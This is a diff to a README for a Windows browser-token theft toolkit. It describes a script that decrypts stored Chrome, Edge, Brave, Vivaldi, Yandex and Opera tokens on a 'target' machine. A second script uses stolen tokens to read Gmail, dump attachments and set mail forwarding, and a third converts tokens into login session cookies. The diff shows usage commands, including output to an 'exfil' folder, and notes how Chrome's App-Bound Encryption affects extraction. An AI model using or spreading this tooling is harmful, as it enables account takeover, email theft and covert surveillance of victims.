@@ -9,7 +9,7 @@
 
 | Tool | What It Does |
 |------|-------------|
-| **`extract_tokens_windows.py`** | Live **extraction** from Windows (Chrome/Edge/Brave) — decrypts DPAPI + AES-256-GCM |
+| **`extract_tokens_windows.py`** | Live **extraction** from Windows (Chrome, Edge, Brave, Vivaldi, Yandex, Opera) — decrypts DPAPI + AES-256-GCM |
 | **`test_token.py`** | **Validate & exploit** tokens — test, check Gmail, fetch emails, send, dump attachments, set forwarding |
 | **`token_to_session.py`** | **Browser access** — convert tokens into session cookies (SAPISID/SSID) for full browser login |
 
@@ -38,8 +38,11 @@ Run `extract_tokens_windows.py` **on the target Windows machine as the logged-in
 :: Chrome only (default)
 python extract_tokens_windows.py
 
-:: Chrome + Edge + Brave
+:: Every supported browser (Chrome, Edge, Brave, Vivaldi, Yandex, Opera)
 python extract_tokens_windows.py --all-browsers
+
+:: A single browser
+python extract_tokens_windows.py --browser yandex
 
 :: Custom output directory
 python extract_tokens_windows.py --output C:\exfil
@@ -53,6 +56,8 @@ python extract_tokens_windows.py --output C:\exfil
 5. Writes `all_tokens.txt` (summary) and `extraction_report.txt` (audit trail)
 
 > ⚠️ **Only works on Windows** — requires `win32crypt.CryptUnprotectData` (DPAPI decryption).
+
+> 🔒 **Chrome 127+ App-Bound Encryption:** if a profile carries `os_crypt.app_bound_encrypted_key`, values prefixed `v20` cannot be opened with DPAPI alone and are skipped with an explicit message (`v10` values still extract normally). See [`docs/TOKEN_EXTRACTION_WINDOWS.md`](docs/TOKEN_EXTRACTION_WINDOWS.md#layer-2-app-bound-encryption-chrome-127).
 
 > 📖 **Full guide:** [`docs/TOKEN_EXTRACTION_WINDOWS.md`](docs/TOKEN_EXTRACTION_WINDOWS.md)
 
